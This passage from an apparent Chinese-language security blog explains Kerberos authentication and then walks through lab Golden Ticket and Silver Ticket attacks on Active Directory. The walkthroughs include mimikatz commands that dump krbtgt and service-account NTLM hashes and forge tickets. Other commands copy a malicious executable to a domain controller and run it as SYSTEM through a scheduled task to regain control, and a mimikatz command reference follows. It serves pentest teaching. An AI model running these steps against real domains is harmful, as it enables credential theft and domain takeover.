class="hljs">人：代表客户端<br>动物园：代表服务端<br>售票处：代表KDC<br></code></pre></td></tr></table></figure><p>所以整个kerberos认证流程可以简化描述如下：客户端在访问每个想要访问的网络服务时 ，他需要携带一个专门   用于访问该服务并且能够证明自己身份的票据 ，当服务端收到了该票据他才能认定客户端身份正确 ， 向客户端提供 服务。所以整个认证流程可简化为两大步：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1、客户端向KDC请求获取想要访问的目标服务的服务授予票据（Ticket）；<br>2、客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务；<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651053.png" alt="image.png"></p><h3 id="Kerberos认证完成流程"><a href="#Kerberos认证完成流程" class="headerlink" title="Kerberos认证完成流程"></a>Kerberos认证完成流程</h3><p>在上述的流程中 ，其实还有一个问题 ，那就是</p><ol><li>KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？<br>我们以去动物园为例 ，售票处凭什么给你买票 ，你如果是一个逃犯怎么办？其实买票的过程我们可以分为两步第一 才步是你拿着身份证去验证 ，第二步身份验证通过了才会给你票<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651157.png" alt="image.png"></li></ol><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos">人：代表客户端<br>动物园：代表服务端<br>售票处：KDC<br>身份校验人员:<span class="hljs-keyword">AS</span>，负责验证用户身份的合法性，和给用户一个可以买票的票（TGT）<br>卖票人员：TGS，负责客户端访问服务端时所需的服务授予票据的单位<br></code></pre></td></tr></table></figure><p>所以kerberos通信可以分为3步 ，我们逐步详解</p><h4 id="通信第一步-客户端和AS进行通信"><a href="#通信第一步-客户端和AS进行通信" class="headerlink" title="通信第一步-客户端和AS进行通信"></a>通信第一步-客户端和AS进行通信</h4><p>为了获得能够用来访问服务端服务的票据 ，客户端首先需要来到KDC获得服务授予票据（Ticket）。 由于客户端是  第一次访问KDC ，此时KDC也不确定该客户端的身份 ，所以第一次通信的目的为KDC认证客户端身份 ，确认客户端 是一个可靠且拥有访问KDC权限的客户端，<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651247.png" alt="image.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>、客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳；<br><span class="hljs-number">2</span>、KDC当中的<span class="hljs-keyword">AS</span>（Authentication <span class="hljs-keyword">Server</span>）接收请求（<span class="hljs-keyword">AS</span>是KDC中专门用来认证客户端身份的认证服务器）后去<br>kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可<br>靠性；<br><span class="hljs-number">3</span>、如果没有该用户名，认证失败，服务结束；如果存在该用户名，则<span class="hljs-keyword">AS</span>认证中心便认为用户存在，此时便会返回响应给<br>客户端，其中包含两部分内容：<br><span class="hljs-number">3.1</span>、第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问<br>网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的<span class="hljs-type">Name</span>，IP，当前时<br>间戳，客户端即将访问的TGS的<span class="hljs-type">Name</span>，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。<br>整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情<br>况。<br><span class="hljs-number">3.2</span>第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客<br>户端即将访问的TGS的<span class="hljs-type">Name</span>以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿<br>到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密<br>钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。<br>至此，第一次通信完成。<br></code></pre></td></tr></table></figure><h4 id="通信第二步-客户端和TGS进行通信"><a href="#通信第二步-客户端和TGS进行通信" class="headerlink" title="通信第二步-客户端和TGS进行通信"></a>通信第二步-客户端和TGS进行通信</h4><p>此时的客户端收到了来自KDC（其实是AS）的响应 ，并获取到了其中的两部分内容。此时客户端会用自己的密钥将 第二部分内容进行解密 ，分别获得时间戳 ， 自己将要访问的TGS的信息 ，和用于与TGS通信时的密钥CT_SK。首先他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟 ，如果大于五分钟则认为该AS是伪造的 ，认证至此失败。如果时间戳合理 ，客户端便准备向TGS发起请求<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651618.png" alt="image.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">客户端行为：<br><span class="hljs-number">1</span>、客户端使用CT_SK加密将自己的客户端信息发送给TGS，其中包括客户端名，IP，时间戳；<br><span class="hljs-number">2</span>、客户端将自己想要访问的<span class="hljs-keyword">Server</span>服务以明文的方式发送给TGS；<br><span class="hljs-number">3</span>、客户端将使用TGS密钥加密的TGT也原封不动的也携带给TGS；<br>TGS行为：<br><span class="hljs-number">1</span>、此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的<span class="hljs-keyword">Server</span>服务IP查<br>看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束，。如果存在，继续接下来的认<br>证。<br><span class="hljs-number">2</span>、TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过<span class="hljs-keyword">AS</span>认证过后并记录的用户信息，一把Session_KEY即<br>CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。<br><span class="hljs-number">3</span>、如果时延正常，则TGS会使用CT_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的<br>用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。<br><span class="hljs-number">4</span>、此时KDC将返回响应给客户端，响应内容包括：<br>第一部分：用于客户端访问网络服务的使用<span class="hljs-keyword">Server</span>密码加密的ST（Servre Ticket），其中包括客户端的<span class="hljs-type">Name</span>，<br>IP，需要访问的网络服务的地址<span class="hljs-keyword">Server</span> IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信CS_SK（<span class="hljs-keyword">Session</span><br>Key）。<br>第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，<span class="hljs-keyword">AS</span><br>已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以<br>自己解密的。<br>至此，第二次通信完成。<br></code></pre></td></tr></table></figure><h4 id="通信第三步-客户端和服务端进行通信"><a href="#通信第三步-客户端和服务端进行通信" class="headerlink" title="通信第三步-客户端和服务端进行通信"></a>通信第三步-客户端和服务端进行通信</h4><p>此时的客户端收到了来自KDC（TGS）的响应 ，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中  的ST是由Server密码加密的 ，客户端无法解密） ，检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651593.png" alt="image.png"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino">客户端：<br><span class="hljs-number">1</span>、客户端使用CS_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）<br>作为第二部分内容都发送给服务端。<br>服务端：<br><span class="hljs-number">1</span>、服务器此时收到了来自客户端的请求，他会使用自己的密钥，即<span class="hljs-built_in">Server</span>密钥将客户端第二部分内容进行解密，核对时<br>间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端<br>信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的<br>具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户<br>端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会<br>使用数字证书证明自己身份）。<br>至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的<br>进行整个网络通信了。<br></code></pre></td></tr></table></figure><p>总体流程如下<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651612.png" alt="image.png"></p><h2 id="Golden-Ticket黄金票据制作原理及利用方式"><a href="#Golden-Ticket黄金票据制作原理及利用方式" class="headerlink" title="Golden Ticket黄金票据制作原理及利用方式"></a>Golden Ticket黄金票据制作原理及利用方式</h2><h3 id="Krbtgt账户介绍"><a href="#Krbtgt账户介绍" class="headerlink" title="Krbtgt账户介绍"></a>Krbtgt账户介绍</h3><p>krbtgt用户 ，是系统在创建域时自动生成的一个帐号 ，其作用是密钥分发中心的服务账号 ，其密码是系统随机生成 的 ，无法登录主机<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651911.png" alt="image.png"></p><h3 id="黄金票据原理"><a href="#黄金票据原理" class="headerlink" title="黄金票据原理"></a>黄金票据原理</h3><p>TGT&#x3D;Krbtgt的html hash 加密<br>1、 Kerberos中的TGT和Logon Session Key（ CT_SK）是AS返回的 ，TGP它是由Krbtgt加密和签名的,kr btgt的 NTLM Hash又是固定的,而CT_SK并不会保存在KDC中。<br>2、所以只要得到kr btgt的NTLM Hash ，就可以伪造TGT和Logon Session Key（ CT_SK）。<br>3、Client与TGS的交互中 ，而已有了金票后（TGT）,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修 改。<br>当我们获得域控的控制权限后 ，有可能获取域内所有用户的hash ，和kr btgt的hash。这时 ， 由于一些原因导致我 们失去对目标的控制权 ，但是我们还留有一个普通用户的权限 ，并且kr btgt的密码没有更改 ，此时我们可以利用   kr btgt用户的ntl m hash制作黄金票据伪造TGT ，重新获取域控的管理权限。<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651754.png" alt="image.png"><br>我们在以去动物园为例 ，当我们去买票的时候 ，我么首先第一步是去身份认证管理员那里认证身份<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651890.png" alt="image.png"></p><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><table><thead><tr><th>实验机器</th><th>IP地址</th></tr></thead><tbody><tr><td>windows server 2016 （域控）</td><td><a href="https://192.168.41.10/">192.168.</a>3.191</td></tr><tr><td>windows server 2012（域内成员）</td><td><a href="https://192.168.41.20/">192.168.</a>3.190</td></tr></tbody></table><h4 id="实验前提"><a href="#实验前提" class="headerlink" title="实验前提"></a>实验前提</h4><p>1、 已经控制了域名并且使用域管理员登录或者提权的system<br>如果域管理员发现了你控制了域控机器 ，把你的后门删除了 ，那么就不能继续控制域控了 ，这个时候当我们可以伪<br>造TGT重新获得域控的权限<br>条件如下：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1</span>、域名称<br><span class="hljs-number">2</span>、域的SID值<br><span class="hljs-number">3</span>、域的KRBTGT账号的<span class="hljs-built_in">HASH</span><br><span class="hljs-number">4</span>、伪造任意用户名<br>（获取域的SID和KRBTGT账号的NTLM <span class="hljs-built_in">HASH</span>的前提是需要已经拿到了域的权限）<br></code></pre></td></tr></table></figure><p>实验步骤<br>1、 目前已经控制了域控和域内机器<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651154.png" alt="image.png"><br>2、获取关键信息</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">whoami</span> /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> net config workstation 查看域</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651170.png" alt="image.png"><br>得到域为：hsmyzj.xyz SID:S-1-5-21-2640154217-865433244-3862815811<br>3、使用mimikatz导出KRBTGT的ntlm hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#  mimikatz lsadump::dcsync /domain:hsmyzj.xyz /user:krbtgt //我这里执行报错，用下面这两条</span><br>mimikatz lsadump::dcsync /domain:hsmyzj.xyz /all /csv<br>mimikatz lsadump::lsa /patch<br></code></pre></td></tr></table></figure><p>krbtgt的ntml：4de0e227976fe702ad351a554c8e3062<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651245.png" alt="image.png"></p><p>4、这个时候突然域控下线了 ，管理员发现的你在控制 ，把后门清理了<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651352.png" alt="image.png"></p><p>5、 因为之前已经记录了关键信息 ，我们现在就可以伪造任意用户访问域控 ，windows 2008机器必须是域内用户或者system用户</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651603.png" alt="image.png"><br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651725.png" alt="image.png"></p><p>6、使用dir 远程访问域控</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\AD-2016.hsmyzj.xyz\c$</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651842.png" alt="image.png"></p><p>7、使用计划任务上线cs<br>copy恶意文件到域控</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">shell copy <span class="hljs-name">c</span>:\users\administrator\desktop\a.exe \\AD<span class="hljs-number">-2016.</span>hsmyzj.xyz\c$<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651916.png" alt="image.png"><br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651044.png" alt="image.png"><br>设置计划任务到域控</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /s AD-2016.hsmyzj.xyz /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\a.exe /ru system /f</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651364.png" alt="image.png"><br>注：这里需要将用户提权至system用户才可写计划任务</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /run /s AD-2016.hsmyzj.xyz /i /tn <span class="hljs-string">&quot;test&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651368.png" alt="image.png"><br>域控重新上线<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651536.png" alt="image.png"></p><h2 id="Silver-Ticket白银票据制作原理及利用方式"><a href="#Silver-Ticket白银票据制作原理及利用方式" class="headerlink" title="Silver Ticket白银票据制作原理及利用方式"></a>Silver Ticket白银票据制作原理及利用方式</h2><h3 id="服务账号介绍"><a href="#服务账号介绍" class="headerlink" title="服务账号介绍"></a>服务账号介绍</h3><p>服务账号就是计算机名字+$用来管理服务的账号</p><h3 id="白银票据原理"><a href="#白银票据原理" class="headerlink" title="白银票据原理"></a>白银票据原理</h3><p>如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。在Kerberos认证的第三部 ，Client带着ST和<br>Authenticator3向Server上的某个服务进行请求 ，Server接收到Client的请求之后,通过自己的Master Key 解密ST, 从而获得Session Key。通过Session Key 解密Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651622.png" alt="image.png"><br>我们以去动物举例<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651938.png" alt="image.png"></p><h4 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h4><table><thead><tr><th>实验机器</th><th>IP地址</th></tr></thead><tbody><tr><td>windows server 2016 （域控）</td><td><a href="https://192.168.41.10/">192.168.</a>3.191</td></tr><tr><td>windows server 2008（域内成员）</td><td><a href="https://192.168.41.20/">192.168.</a>3.180</td></tr></tbody></table><h4 id="实验前提-1"><a href="#实验前提-1" class="headerlink" title="实验前提"></a>实验前提</h4><p>1、 已经控制了域控并且使用域管理员登录或者提权的system<br>我们的目的是去访问windows server 2003 的机器<br>条件如下：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>域名<br><span class="hljs-number">2.</span>域sid<br><span class="hljs-number">3.</span>目标服务器名<br><span class="hljs-number">4.</span>可利用的服务<br><span class="hljs-number">5.</span>服务账号的NTML <span class="hljs-built_in">HASH</span><br><span class="hljs-number">6.</span>需要伪造的用户名<br></code></pre></td></tr></table></figure><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>控制域控<br>1、获取基本信息</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">whoami</span> /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> net config workstation 查看域</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651935.png" alt="image.png"><br>得到域为： hsmyzj.xyz SID:S-1-5-21-2640154217-865433244-3862815811<br>2、获取服务账号的ntlm hash值</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651948.png" alt="image.png"><br>得到hash e1d609b421cdd45028c8eae8aa361d15<br>3、伪造票据（CIFS共享服务）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br>shell klist 查票<br>shell klist purge 清票<br>mimikatz kerberos::golden /domain:hsmyzj.xyz /sid:S-1-5-21-2640154217-865433244-3862815811<br>/target:AD-2016.hsmyzj.xyz /service:cifs /rc4:e1d609b421cdd45028c8eae8aa361d15 /user:abcd /ptt<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651223.png" alt="image.png"><br>4、访问域控</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\AD-2016.hsmyzj.xyz\c$</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651437.png" alt="image.png"><br>6、伪造票据（LDAP共享服务）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br>shell klist 查票<br>shell klist purge 清票<br>mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185<br>/target:dc.hack.com /service:LDAP /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651520.png" alt="image.png"></p><p>7、查询域控的krgtgt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz lsadump::dcsync /domain:hsmyzj.xyz /all /csv<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651700.png" alt="image.png"><br>我们重新拿到krbtgt的ntml之后，我们可以继续使用上一个实验的黄金票据重新拿回域控</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651705.png" alt="image.png"></h3><p>4、访问2003</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> dir \\<span class="hljs-keyword">pc</span>‐<span class="hljs-number">2003</span>.hack.<span class="hljs-keyword">com</span>\<span class="hljs-keyword">c</span>$<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651009.png" alt="image.png"></p><h2 id="Mimikatz介绍和离线读取SAM文件抓取密码"><a href="#Mimikatz介绍和离线读取SAM文件抓取密码" class="headerlink" title="Mimikatz介绍和离线读取SAM文件抓取密码"></a>Mimikatz介绍和离线读取SAM文件抓取密码</h2><h3 id="Mimikatz介绍"><a href="#Mimikatz介绍" class="headerlink" title="Mimikatz介绍"></a>Mimikatz介绍</h3><p>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具 ，但由于其功能强大 ，能够直接读取<br>WindowsXP-2012等操作系统的明文密码而闻名于渗透测试 ，可以说是渗透必备工具 ， mimikatz可以从内存中提 取明文密码、哈希、 PIN 码和kerberos 票证。mimikatz 还可以执行哈希传递、票证传递或构建黄金票证<br>项目地址 <a href="https://github.com/gentilkiwi/mimikatz/">https://github.com/gentilkiwi/mimikatz/</a><br>模块命令如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">cls：             清屏<br>standard：   标准模块 ，基本命令<br>crypto：       加密相关模块<br>sekurlsa：    与证书相关的模块<br>kerberos：    kerberos模块<br>privilege：  提权相关模块<br>process：     进程相关模块<br>serivce：     服务相关模块<br>lsadump：      LsaDump模块<br>ts：               终端服务器模块<br>event：         事件模块<br>misc：           杂项模块<br>token：         令牌操作模块<br>vault：         Windows 、证书模块<br>minesweeper：Mine Sweeper模块<br>net：<br>dpapi：         DPAPI模块（通过API或RAW访问） [数据保护应用程序编程接口]<br>busylight：  BusyLight Module<br>sysenv：       系统环境值模块<br>sid：             安全标识符模块<br>iis：             IIS XML配置模块<br>rpc：             mimikatz的RPC控制<br>sr98：           用于SR98设备和T5577目标的RF模块<br>rdm：             RDM（ <span class="hljs-number">830</span>AL）器件的射频模块<br>acr：             ACR模块<br>version：     查看版本<br><span class="hljs-keyword">exit</span>：           退出<br></code></pre></td></tr></table></figure><p>常用命令</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-title function_">CRYPTO::Certificates</span>  – 列出/导出凭证。<br><span class="hljs-title function_">KERBEROS::Golden</span> – 创建黄金票证/白银票证/信任票证。<br><span class="hljs-title function_">KERBEROS::List</span> – 列出在用户的内存中所有用户的票证（TGT 和  TGS）。<br><span class="hljs-title function_">KERBEROS::PTT</span> – 票证传递。<br><span class="hljs-title function_">LSADUMP::DCSync</span> – 向  DC 发起同步一个对象（获取帐户的密码数据）的质询。<br><span class="hljs-title function_">LSADUMP::LSA</span> – 向  LSA Server 质询检索  SAM/AD 的数据（正常或未打补丁的情况下）。可以从  DC 或者是一个<br>l sass.dmp的转储文件中<br>导出所有的Active <span class="hljs-literal">Directory</span> 域凭证数据。 同样也可以获取指定帐户的凭证 ，如  krbtgt 帐户 ，使用  /<span class="hljs-keyword">name</span> 参数， 如 ：“/<span class="hljs-keyword">name</span>:krbtgt”。<br><span class="hljs-title function_">LSADUMP::SAM</span> ‐ 获取  SysKey 来解密  SAM 的项目数据（从注册表或者  hive 中导出）SAM 选项。可以连接到本地安 全帐户管理器（SAM）<br>数据库中并能转储本地帐户的凭证。可以用来转储在 Windows 计算机上的所有的本地凭据。<br><span class="hljs-title function_">LSADUMP::Trust</span> ‐ 向  LSA Server 质询来获取信任的认证信息（正常或未打补丁的情况下）为所有相关的受信的域或 林转储信任密钥（密码）<br><span class="hljs-title function_">MISC::AddSid</span> – 将用户帐户添加到  SID 历史记录。第一个值是目标帐户 ，第二值是帐户/组名（可以是多个或  SID )  。<br><span class="hljs-title function_">MISC::MemSSP</span> – 注入恶意的  Wndows SSP 来记录本地身份验证凭据。<br><span class="hljs-title function_">MISC::Skeleton</span> – 在  DC 中注入万能钥匙（Skeleton Key）  到  LSASS 进程中。这使得所有用户所。<br>使用的万能钥匙修补  DC 使用  “主密码” （又名万能钥匙）以及他们自己通常使用的密码进行身份验证。<br><span class="hljs-title function_">PRIVILEGE::Debug</span> – 获得  Debug 权限（很多  Mimikatz 命令需要  Debug 权限或本地  <span class="hljs-params">SYSTEM</span> 权限）。 <span class="hljs-title function_">SEKURLSA::Ekeys</span> – 列出  Kerberos 密钥<br><span class="hljs-title function_">SEKURLSA::Kerberos</span> – 列出所有已通过认证的用户的  Kerberos 凭证（包括服务帐户和计算机帐户）。 <span class="hljs-title function_">SEKURLSA::Krbtgt</span> – 获取域中  Kerberos 服务帐户（KRBTGT）的密码数据。<br><span class="hljs-title function_">SEKURLSA::LogonPasswords</span> – 列出所有可用的提供者的凭据。这个命令通常会显示最近登录过的用户和最近登录过的 计算机的凭证。<br><span class="hljs-title 